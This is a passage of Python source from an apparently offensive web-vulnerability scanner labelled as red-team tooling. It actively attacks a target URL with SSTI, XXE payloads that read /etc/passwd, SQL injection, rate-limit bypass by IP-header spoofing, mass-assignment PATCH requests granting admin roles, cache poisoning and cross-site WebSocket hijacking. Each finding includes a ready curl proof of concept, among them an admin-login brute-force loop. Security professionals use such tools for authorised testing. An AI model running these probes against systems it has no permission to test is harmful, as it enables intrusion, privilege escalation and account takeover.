                evidence="\n".join(f"{v['header']}: {v['value']}" for v in vulns),
                reproduction=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                poc_curl=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                burp_request=f"GET / HTTP/1.1\nHost: {host}\nX-Forwarded-Host: evil.com\n",
                category="Host Header Injection",
                remediation="Validate Host header against allowlist. Disable override headers."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 25: HTTP PARAMETER POLLUTION  (SKILL-35)
# ══════════════════════════════════════════════════════════════
class HTTPParameterPollution:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HPP-25: HTTP Parameter Pollution testing")
        base = profile.url.rstrip("/")
        vulns = []
        # Use params discovered from JS/Wayback
        params_to_test = list(set(profile.parameters[:10] + ["id","user","role","admin","price","amount"]))
        for param in params_to_test[:8]:
            # Duplicate param with different values
            url_dup  = f"{base}?{param}=SAFE&{param}=INJECTED"
            url_arr  = f"{base}?{param}[]=SAFE&{param}[]=INJECTED"
            for label, url in [("duplicate", url_dup), ("array_notation", url_arr)]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if "INJECTED" in body and "SAFE" not in body.split("INJECTED")[0][-20:]:
                    warn(f"  HPP [{label}]: param '{param}' — INJECTED value used")
                    vulns.append({"param": param, "type": label, "url": url})
        if vulns:
            profile.findings.append(Finding(
                id="F-HPP-001", title="HTTP Parameter Pollution",
                severity="MEDIUM", cwe="CWE-235", cvss=5.3,
                description=f"Duplicate parameters accepted: {[v['param'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v['url'][:80]}" for v in vulns),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:2]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="Parameter Pollution",
                remediation="Accept only the first or last value of a parameter. Reject duplicates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 26: RATE LIMIT BYPASS  (SKILL-36)
# ══════════════════════════════════════════════════════════════
class RateLimitBypassTester:
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded-For": "0.0.0.0"},
        {"X-Forwarded-For": "10.0.0.1"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("RATELIMIT-26: Rate limit bypass via header spoofing")
        # Find a login/auth endpoint
        login_paths = ["/api/login", "/api/auth", "/login", "/api/token", "/auth/login"]
        login_url = None
        for path in login_paths:
            code, _, _ = _fetch(profile.url.rstrip("/") + path,
                                cfg.user_agent, cfg.timeout,
                                method="POST",
                                data=b'{"username":"test","password":"test"}',
                                headers_extra={"Content-Type": "application/json"})
            if code in [200, 400, 401, 403]:
                login_url = profile.url.rstrip("/") + path
                break
        if not login_url:
            info("  No login endpoint found for rate limit testing")
            return profile

        # Baseline — hit it 5 times and check for 429
        codes = []
        for _ in range(5):
            code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                method="POST", data=b'{"username":"test","password":"wrong"}',
                                headers_extra={"Content-Type": "application/json"})
            codes.append(code)
            time.sleep(0.2)

        if 429 in codes or 403 in codes:
            ok(f"  Rate limiting active on {login_url} (got {set(codes)})")
            # Try bypasses
            for bypass_hdrs in self.BYPASS_HEADERS:
                code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                    method="POST", data=b'{"username":"test","password":"wrong"}',
                                    headers_extra={"Content-Type":"application/json", **bypass_hdrs})
                if code not in [429, 403]:
                    high(f"  RATE LIMIT BYPASS via {bypass_hdrs}: HTTP {code}")
                    profile.findings.append(Finding(
                        id=f"F-RL-{len(profile.findings):03d}",
                        title="Rate Limit Bypass via Spoofed IP Header",
                        severity="MEDIUM", cwe="CWE-307", cvss=6.5,
                        description=f"Rate limiting bypassed by setting {list(bypass_hdrs.keys())[0]}.",
                        evidence=f"Normal: {set(codes)} | With {bypass_hdrs}: {code}",
                        reproduction=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"wordlist_entry\"}}'",
                        poc_curl=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                        category="Rate Limiting",
                        remediation="Rate-limit by user/device fingerprint, not just IP. Block spoofed IP headers."
                    ))
                    break
        else:
            warn(f"  No rate limiting detected on {login_url} — brute-force possible!")
            profile.findings.append(Finding(
                id="F-RL-NORL", title="No Rate Limiting on Login Endpoint",
                severity="HIGH", cwe="CWE-307", cvss=7.5,
                description=f"Login endpoint {login_url} has no rate limiting.",
                evidence=f"5 requests returned: {codes}",
                reproduction=f"for i in $(seq 1 100); do curl -sk -X POST '{login_url}' -d '{{\"username\":\"admin\",\"password\":\"test$i\"}}'; done",
                poc_curl=f"curl -sk -X POST '{login_url}' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                category="Rate Limiting",
                remediation="Implement account lockout or CAPTCHA after 5 failed attempts."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 27: CACHE POISONING DETECTOR  (SKILL-37)
# ══════════════════════════════════════════════════════════════
class CachePoisoningDetector:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CACHE-27: Cache poisoning via unkeyed headers")
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        is_cached = any(k in hdrs for k in ["x-cache","cf-cache-status","age","x-varnish","x-fastly"])
        if not is_cached:
            info("  No caching headers — cache poisoning less likely")
            return profile

        ok(f"  Caching detected: {[(k,hdrs[k]) for k in hdrs if k in ['x-cache','cf-cache-status','age']]}")

        # Test unkeyed X-Forwarded-Host header
        poison_code, poison_body, poison_hdrs = _fetch(
            profile.url, cfg.user_agent, cfg.timeout,
            headers_extra={"X-Forwarded-Host": "poison.evil.com",
                           "Cache-Control": "no-cache"})
        if "poison.evil.com" in poison_body:
            high("  CACHE POISONING: X-Forwarded-Host reflected in cached response!")
            profile.findings.append(Finding(
                id="F-CACHE-001", title="Web Cache Poisoning via X-Forwarded-Host",
                severity="HIGH", cwe="CWE-444", cvss=8.1,
                description="Unkeyed X-Forwarded-Host header reflected in cacheable response.",
                evidence=f"Header sent: X-Forwarded-Host: poison.evil.com\nReflected in body",
                reproduction=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                poc_curl=f"curl -sk -H 'X-Forwarded-Host: evil.com' -H 'Cache-Control: no-cache' '{profile.url}'",
                category="Cache Poisoning",
                remediation="Include all headers that influence responses as cache keys."
            ))

        # Cache deception path test
        for ext in [".css", ".jpg", ".js", ".png"]:
            deception_url = profile.url.rstrip("/") + "/profile" + ext
            code2, body2, hdrs2 = _fetch(deception_url, cfg.user_agent, cfg.timeout)
            if code2 == 200 and any(k in hdrs2 for k in ["x-cache","age"]):
                warn(f"  Cache deception candidate: {deception_url}")

        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 28: SSTI SCANNER  (SKILL-38)
# ══════════════════════════════════════════════════════════════
class SSTIScanner:
    ENGINE_MAP = {
        "49": "Jinja2/Twig/Pebble ({{7*7}}=49)",
        "7777777": "Twig ({{'7'*7}})",
        "0123456": "Jinja2 (range loop)",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSTI-28: Server-Side Template Injection ({{7*7}} detection)")
        base = profile.url.rstrip("/")
        # Find input params from forms and Wayback
        test_params = list(set(profile.parameters[:5] + ["name","search","q","message","template","subject"]))
        confirmed = []

        for param in test_params[:8]:
            for payload in PAYLOADS_SSTI[:6]:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                # Check for evaluated result
                for indicator, engine in self.ENGINE_MAP.items():
                    if indicator in body and payload not in body:
                        high(f"  SSTI CONFIRMED! Param '{param}' payload '{payload}' → '{indicator}' ({engine})")
                        confirmed.append({"param": param, "payload": payload, "engine": engine, "url": test_url})
                        profile.ssti_params.append(param)
                # Also check POST forms
                if profile.forms:
                    for form in profile.forms[:3]:
                        action = form.get("action", base)
                        if not action.startswith("http"): action = base + action
                        p_code, p_body, _ = _fetch(action, cfg.user_agent, cfg.timeout,
                                                   method="POST",
                                                   data=urllib.parse.urlencode({param: payload}).encode())
                        for indicator, engine in self.ENGINE_MAP.items():
                            if indicator in p_body and payload not in p_body:
                                high(f"  SSTI CONFIRMED (POST form)! '{param}' → '{indicator}' ({engine})")
                                confirmed.append({"param": param, "payload": payload, "engine": engine, "url": action})

        if confirmed:
            profile.findings.append(Finding(
                id="F-SSTI-001", title="Server-Side Template Injection (SSTI)",
                severity="CRITICAL", cwe="CWE-94", cvss=9.8,
                description=f"SSTI confirmed in params: {[c['param'] for c in confirmed]}. Engine: {confirmed[0]['engine']}",
                evidence="\n".join(f"{c['param']}: {c['payload']} → evaluated | {c['engine']}" for c in confirmed),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="SSTI",
                remediation="Never pass user input to template engines. Use sandboxed rendering or static templates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 29: XXE INJECTION PROBER  (SKILL-39)
# ══════════════════════════════════════════════════════════════
class XXEProber:
    XML_ENDPOINTS = ["/api", "/api/v1", "/upload", "/api/import",
                     "/ws", "/soap", "/service", "/api/parse","/xmlrpc.php"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("XXE-29: XML injection + SOAP endpoint probing")
        base = profile.url.rstrip("/")
        found = []

        for path in self.XML_ENDPOINTS:
            url = base + path
            for payload in PAYLOADS_XXE[:2]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                       method="POST", data=payload.encode(),
                                       headers_extra={"Content-Type": "application/xml",
                                                      "Accept": "application/xml,text/xml,*/*"})
                if code == 200 and ("root:" in body or "bin:" in body or "nobody:" in body):
                    high(f"  XXE CONFIRMED at {url} — /etc/passwd read!")
                    found.append({"url": url, "payload": payload[:60]})
                elif code in [400, 500] and "xml" in body.lower():
                    warn(f"  XML parsing error at {url} [{code}] — investigate manually")
                elif code == 200 and code != 0:
                    # Check for SSRF OOB reflection
                    if "169.254" in body or "metadata" in body.lower():
                        high(f"  XXE OOB/SSRF via {url}")
                        found.append({"url": url, "payload": payload[:60]})

        # Also check for SVG upload vectors
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        svg_inputs = re.findall(r'<input[^>]*accept=["\'][^"\']*(?:svg|image)[^"\']*["\'][^>]*>', html_body, re.I)
        if svg_inputs:
            warn(f"  SVG upload input found — test XXE via SVG")
            found.append({"url": profile.url, "payload": "SVG upload vector", "note": "manual"})

        if found:
            profile.findings.append(Finding(
                id="F-XXE-001", title="XXE / XML External Entity Injection",
                severity="CRITICAL" if any("passwd" in f.get("payload","") for f in found) else "HIGH",
                cwe="CWE-611", cvss=9.1,
                description=f"XXE injection points identified at {[f['url'] for f in found]}",
                evidence="\n".join(f"{f['url']}: {f['payload']}" for f in found),
                reproduction="\n".join(f"curl -sk -X POST '{f['url']}' -H 'Content-Type: application/xml' -d '{PAYLOADS_XXE[0][:100]}...'" for f in found[:2]),
                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'",
                category="XXE",
                remediation="Disable external entity processing. Use a safe XML parser configuration."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 30: PROTOTYPE POLLUTION SCANNER  (SKILL-40)
# ══════════════════════════════════════════════════════════════
class PrototypePollutionScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PROTO-30: Prototype Pollution (__proto__, constructor.prototype)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test URL-based prototype pollution
        test_url = f"{base}?__proto__[polluted]=APEX_TEST&constructor[prototype][polluted]=APEX_TEST"
        code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
        if "APEX_TEST" in body:
            high(f"  PROTOTYPE POLLUTION via URL params!")
            vulns.append({"type": "url_param", "url": test_url})

        # Test JSON body prototype pollution on API endpoints
        for path in ["/api", "/api/v1", "/api/user", "/api/settings"]:
            url = base + path
            for payload in PAYLOADS_PROTO_POLLUTION:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                                         method="POST", data=payload.encode(),
                                         headers_extra={"Content-Type": "application/json"})
                if code in [200, 201] and "APEX_HUNTER" in body:
                    high(f"  PROTOTYPE POLLUTION via JSON body at {path}!")
                    vulns.append({"type": "json_body", "url": url, "payload": payload})

        if vulns:
            profile.findings.append(Finding(
                id="F-PP-001", title="Prototype Pollution Vulnerability",
                severity="HIGH", cwe="CWE-1321", cvss=8.1,
                description=f"Prototype pollution via: {[v['type'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v.get('url','')} | {v.get('payload','')[:60]}" for v in vulns),
                reproduction=f"curl -sk '{base}?__proto__[polluted]=yes' | grep polluted",
                poc_curl=f"curl -sk '{base}?__proto__[polluted]=APEX_TEST'",
                category="Prototype Pollution",
                remediation="Use Object.create(null) for config maps. Freeze Object.prototype. Validate JSON keys."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# TOOL 31: GRAPHQL ADVANCED ATTACK SUITE  (SKILL-41)
# ══════════════════════════════════════════════════════════════
class GraphQLAdvanced:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GQL-ADV-31: GraphQL batch attacks + alias introspection bypass")
        if not profile.graphql_endpoints:
            return profile
        for gql_url in profile.graphql_endpoints[:2]:
            # Alias-based introspection bypass (bypasses disabled introspection)
            alias_query = json.dumps({"query": "{a:__typename b:__schema{types{name}}}"})
            code, body, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=alias_query.encode(),
                                   headers_extra={"Content-Type":"application/json"})
            if code == 200 and "__schema" in body:
                high(f"  GRAPHQL: Alias introspection bypass works at {gql_url}")
            # Batch query attack — alias multiplication
            batch = json.dumps({"query": " ".join(
                f"q{i}: __typename" for i in range(100))})
            code2, body2, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                     method="POST", data=batch.encode(),
                                     headers_extra={"Content-Type":"application/json"})
            if code2 == 200 and "q99" in body2:
                warn(f"  GRAPHQL BATCH: 100-alias query accepted — brute-force/DoS risk")
                profile.findings.append(Finding(
                    id="F-GQL-ADV-001", title="GraphQL Batch Query Attack",
                    severity="MEDIUM", cwe="CWE-770", cvss=6.5,
                    description="GraphQL accepts batched alias queries enabling brute-force or DoS.",
                    evidence=f"100 aliased queries returned HTTP {code2}",
                    reproduction=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{q1:__typename q2:__typename ... q100:__typename}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{batch[:150]}'",
                    category="GraphQL",
                    remediation="Implement query complexity limits and alias count restrictions."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 32: DEPENDENCY CONFUSION DETECTOR  (SKILL-42)
# ══════════════════════════════════════════════════════════════
class DependencyConfusionDetector:
    MANIFEST_PATHS = ["/package.json", "/composer.json", "/requirements.txt",
                      "/Gemfile", "/build.gradle", "/pom.xml", "/go.mod",
                      "/yarn.lock", "/package-lock.json", "/Pipfile"]

    INTERNAL_PATTERNS = re.compile(
        r'(?i)(@company|@internal|@private|@corp|@myorg|@local|'
        r'internal-|private-|corp-|company-|intranet-)')

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("DEPCNF-32: Dependency confusion / supply chain detector")
        base = profile.url.rstrip("/")
        findings = []

        for path in self.MANIFEST_PATHS:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and body:
                high(f"  MANIFEST EXPOSED: {path} ({len(body)}b)")
                # Extract package names
                pkg_names = []
                try:
                    if path == "/package.json":
                        data = json.loads(body)
                        deps = {**data.get("dependencies",{}), **data.get("devDependencies",{})}
                        pkg_names = list(deps.keys())
                    elif path == "/requirements.txt":
                        pkg_names = [line.split("==")[0].split(">=")[0].strip()
                                     for line in body.splitlines() if line.strip() and not line.startswith("#")]
                except Exception: pass

                # Check for internal package naming patterns
                for pkg in pkg_names:
                    if self.INTERNAL_PATTERNS.search(pkg):
                        high(f"  INTERNAL PACKAGE NAME: '{pkg}' — dependency confusion candidate!")
                        findings.append({"pkg": pkg, "source": path})

                profile.sensitive_paths.append(path)
                profile.findings.append(Finding(
                    id=f"F-DEP-{len(profile.findings):03d}",
                    title=f"Dependency Manifest Exposed: {path}",
                    severity="HIGH" if findings else "MEDIUM",
                    cwe="CWE-829", cvss=8.1 if findings else 5.3,
                    description=f"Package manifest {path} is publicly accessible." +
                                (f" Internal package names found: {[f['pkg'] for f in findings]}" if findings else ""),
                    evidence=body[:200],
                    reproduction=f"curl -s '{base+path}'",
                    poc_curl=f"curl -sk '{base+path}'",
                    category="Supply Chain",
                    remediation="Block access to manifest files. Use private registry for internal packages."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 33: BUSINESS LOGIC PROBE  (SKILL-43)
# ══════════════════════════════════════════════════════════════
class BusinessLogicProbe:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BIZ-33: Business logic (negative price, integer overflow, coupon)")
        base = profile.url.rstrip("/")
        test_cases = [
            ("negative_price",   {"price": -1, "amount": -1, "quantity": -1}),
            ("zero_price",       {"price": 0, "amount": 0, "cost": 0}),
            ("overflow",         {"price": 99999999999, "quantity": 2147483648}),
            ("coupon_empty",     {"coupon": "", "promo": ""}),
            ("coupon_null",      {"coupon": None, "discount_code": None}),
        ]
        cart_paths = ["/api/cart", "/api/order", "/api/checkout", "/api/purchase",
                      "/cart", "/checkout", "/api/v1/orders", "/api/booking"]
        vulns = []

        for path in cart_paths[:5]:
            url = base + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if code not in [200, 201, 400, 401]: continue
            # Try each logic test case
            for label, params in test_cases:
                payload = json.dumps(params).encode()
                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=payload,
                                   headers_extra={"Content-Type":"application/json"})
                if tc in [200, 201]:
                    # Look for success indicators
                    if any(k in tb.lower() for k in ["success","order_id","booking_id","confirmed","total"]):
                        high(f"  BUSINESS LOGIC [{label}] at {path}: got {tc} — check total amount!")
                        vulns.append({"label": label, "path": path, "params": params})

        if vulns:
            profile.findings.append(Finding(
                id="F-BIZ-001", title="Business Logic Vulnerability",
                severity="HIGH", cwe="CWE-840", cvss=8.1,
                description=f"Business logic issues: {[v['label'] for v in vulns]}",
                evidence="\n".join(f"{v['label']} at {v['path']}: {v['params']}" for v in vulns),
                reproduction="\n".join(
                    "curl -sk -X POST '" + base + v["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(v["params"]) + "'"
                    for v in vulns[:2]),
                poc_curl="curl -sk -X POST '" + base + vulns[0]["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(vulns[0]["params"]) + "'",
                category="Business Logic",
                remediation="Validate all numeric inputs server-side. Reject negative/zero prices. Enforce coupon rules."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 34: WEBSOCKET SECURITY TESTER  (SKILL-44)
# ══════════════════════════════════════════════════════════════
class WebSocketTester:
    WS_PATHS = ["/ws", "/websocket", "/socket", "/socket.io",
                "/api/ws", "/chat", "/live", "/stream", "/realtime"]

    def _detect_ws_upgrade(self, url: str, ua: str, timeout: int) -> bool:
        code, body, hdrs = _fetch(url, ua, timeout,
                                  headers_extra={"Connection": "Upgrade",
                                                 "Upgrade": "websocket",
                                                 "Sec-WebSocket-Version": "13",
                                                 "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode()})
        return code == 101 or hdrs.get("upgrade","").lower() == "websocket"

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WS-34: WebSocket security (CSWSH, ws:// downgrade, Origin bypass)")
        base = profile.url.rstrip("/")
        ws_found = []

        # Detect WS endpoints from JS
        for js_url in profile.js_files[:10]:
            _, content, _ = _fetch(js_url, cfg.user_agent, cfg.timeout)
            ws_refs = re.findall(r'wss?://[^\s"\'<>]+', content)
            for ref in ws_refs:
                ws_found.append(ref); warn(f"  WebSocket URL in JS: {ref}")
                profile.websocket_endpoints.append(ref)

        # Probe known WS paths
        for path in self.WS_PATHS:
            url = base + path
            if self._detect_ws_upgrade(url, cfg.user_agent, 5):
                high(f"  WebSocket endpoint: {url}")
                ws_found.append(url)
                profile.websocket_endpoints.append(url)
            # Also check HTML for socket references
            code, body, _ = _fetch(url, cfg.user_agent, 5)
            if code == 200 and re.search(r'socket\.io|websocket|ws\.connect', body, re.I):
                ws_found.append(url)

        if ws_found:
            # CSWSH test — send cross-origin request
            for ws_url in ws_found[:3]:
                http_url = ws_url.replace("wss://","https://").replace("ws://","http://")
                code, body, hdrs = _fetch(http_url, cfg.user_agent, cfg.timeout,
                                         headers_extra={"Origin": "https://evil.com"})
                upgrade = hdrs.get("upgrade","")
                if code == 101 or "websocket" in upgrade.lower():
                    high(f"  CSWSH: Cross-origin WebSocket connection accepted from evil.com!")
                    profile.findings.append(Finding(
                        id=f"F-WS-{len(profile.findings):03d}",
                        title="Cross-Site WebSocket Hijacking (CSWSH)",
                        severity="HIGH", cwe="CWE-346", cvss=8.1,
                        description=f"WebSocket at {ws_url} accepts connections from arbitrary origins.",
                        evidence=f"Origin: evil.com → HTTP {code} | Upgrade: {upgrade}",
                        reproduction=f"# Browser PoC:\nnew WebSocket('{ws_url}')",
                        poc_curl=f"curl -sk -H 'Origin: https://evil.com' -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' '{http_url}'",
                        category="WebSocket",
                        remediation="Validate Origin header against allowlist. Require auth tokens in WS handshake."
                    ))

            # Check for ws:// (no TLS) downgrade
            for ws_url in ws_found:
                if ws_url.startswith("ws://"):
                    warn(f"  WS DOWNGRADE: Unencrypted ws:// in use: {ws_url}")
                    profile.findings.append(Finding(
                        id=f"F-WS-PLAIN-{len(profile.findings):03d}",
                        title="Unencrypted WebSocket (ws://)",
                        severity="MEDIUM", cwe="CWE-311", cvss=5.9,
                        description=f"WebSocket communication without TLS: {ws_url}",
                        evidence=f"URL: {ws_url}",
                        reproduction=f"Intercept WebSocket traffic with mitmproxy",
                        poc_curl=f"# Cannot test with curl — use websocat: websocat '{ws_url}'",
                        category="WebSocket",
                        remediation="Use wss:// exclusively. Redirect ws:// to wss://."
                    ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 35: IDOR DEEP SCANNER / BOLA  (SKILL-45)
# ══════════════════════════════════════════════════════════════
class IDORDeepScanner:
    BOLA_PATHS = [
        "/api/users/{id}", "/api/user/{id}", "/api/accounts/{id}",
        "/api/tickets/{id}", "/api/orders/{id}", "/api/bookings/{id}",
        "/api/invoices/{id}", "/api/requests/{id}", "/api/cards/{id}",
        "/hc/requests/{id}", "/api/v1/users/{id}", "/api/v2/tickets/{id}",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BOLA-35: IDOR deep scanner (BOLA, mass assignment, privilege escalation)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test BOLA — enumerate adjacent IDs on known patterns
        for path_tpl in self.BOLA_PATHS:
            for test_id in [1, 2, 100, 1000, 9999]:
                url = base + path_tpl.replace("{id}", str(test_id))
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                if code == 200 and len(body) > 50:
                    # Check if response looks like real user data
                    data_indicators = ["email","name","username","phone","id","created","updated"]
                    if sum(1 for d in data_indicators if d in body.lower()) >= 3:
                        warn(f"  BOLA candidate: {url} ({len(body)}b)")
                        vulns.append({"url": url, "id": test_id, "size": len(body)})
                        # Check for mass assignment — try PATCH with extra fields
                        patch_payload = json.dumps({"role":"admin","is_admin":True,"admin":True,"privilege":"superuser"}).encode()
                        p_code, p_body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                                   method="PATCH", data=patch_payload,
                                                   headers_extra={"Content-Type":"application/json"})
                        if p_code in [200, 201]:
                            high(f"  MASS ASSIGNMENT accepted at {url}!")
                            profile.findings.append(Finding(
                                id=f"F-MASS-{len(profile.findings):03d}",
                                title="Mass Assignment Vulnerability",
                                severity="CRITICAL", cwe="CWE-915", cvss=9.8,
                                description=f"PATCH {url} accepted admin/role fields without restriction.",
                                evidence=f"URL: {url} | PATCH {patch_payload.decode()[:80]} → HTTP {p_code}",
                                reproduction=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                poc_curl=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                category="Mass Assignment",
                                remediation="Use explicit allowlists for accepted fields. Never bind request body directly to model."
                            ))
                        break  # Found one — move to next pattern

        if vulns:
            # Check if IDs are sequential (BOLA more severe)
            sizes = [v["size"] for v in vulns]
            sequential = len(set(v["id"] for v in vulns)) == len(vulns)
            profile.findings.append(Finding(
                id="F-BOLA-001", title="Broken Object Level Authorization (BOLA/IDOR)",
                severity="HIGH", cwe="CWE-639", cvss=8.6,
                description=f"API returns other users' data without authorization check. {len(vulns)} endpoints confirmed.",
                evidence="\n".join(f"ID {v['id']}: {v['url']} ({v['size']}b)" for v in vulns[:5]),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:3]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="IDOR/BOLA",
                remediation="Implement object-level authorization checks. Verify resource ownership on every request."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     █████╗
# ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ██╔══██╗
# ██████╔╝███████║███████║███████╗█████╗      ╚█████╔╝
# ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ██╔══██╗
# ██║     ██║  ██║██║  ██║███████║███████╗    ╚█████╔╝
# ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚════╝
# TOOLS 36-65 — 30 Advanced Red Team Skills (Phase 8)
# ══════════════════════════════════════════════════════════════

# ── TOOL 36: SQL INJECTION SCANNER  (SKILL-46) ─────────────
class SQLiScanner:
    """Error-based, boolean-blind, time-safe SQLi detection."""
    ERROR_SIGS = [
        r"you have an error in your sql syntax",
        r"warning: mysql",r"unclosed quotation mark",
        r"pg_query\(\).*failed",r"ora-\d{4,5}:",
        r"microsoft ole db provider for sql server",
        r"sqlite3\.operationalerror",r"syntax error.*near",
        r"invalid query",r"com\.microsoft\.sqlserver",
    ]
    BOOL_PAYLOADS = [("' AND 1=1--","' AND 1=2--"),("1 AND 1=1","1 AND 1=2")]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SQLI-36: SQL Injection (error-based + boolean-blind detection)")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["id","user","search","q","name","email","category","order"]))
        confirmed = []
        for param in params[:10]:
            # Error-based
            for payload in ["'", '"', "''", "1 UNION SELECT NULL--"]:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                for sig in self.ERROR_SIGS:
                    if re.search(sig, body, re.I):
                        high(f"  SQLi ERROR: param '{param}' | sig: {sig[:40]}")
                        confirmed.append({"param":param,"type":"error","payload":payload,"url":url})
                        break
            # Boolean-blind — compare responses
            for true_p, false_p in self.BOOL_PAYLOADS:
                url_t = f"{base}?{param}={urllib.parse.quote(true_p)}"
                url_f = f"{base}?{param}={urllib.parse.quote(false_p)}"
                ct, bt, _ = _fetch(url_t, cfg.user_agent, cfg.timeout)
                cf, bf, _ = _fetch(url_f, cfg.user_agent, cfg.timeout)
                if ct == cf and ct == 200 and abs(len(bt)-len(bf)) > 50:
                    warn(f"  SQLi BOOLEAN: param '{param}' — response length diff {len(bt)} vs {len(bf)}")
                    confirmed.append({"param":param,"type":"boolean","payload":true_p,"url":url_t})
            # POST body
            for payload in ["'", "1 AND 1=1"]:
                p_code, p_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
                for sig in self.ERROR_SIGS:
                    if re.search(sig, p_body, re.I):
                        high(f"  SQLi POST ERROR: param '{param}'")
                        confirmed.append({"param":param,"type":"error_post","payload":payload,"url":base})
        if confirmed:
            profile.findings.append(Finding(
                id="F-SQLI-001", title="SQL Injection Detected",
                severity="CRITICAL", cwe="CWE-89", cvss=9.8,
                description=f"SQL injection in params: {list(set(c['param'] for c in confirmed))}",
                evidence="\n".join(f"{c['type']} | {c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="SQL Injection",
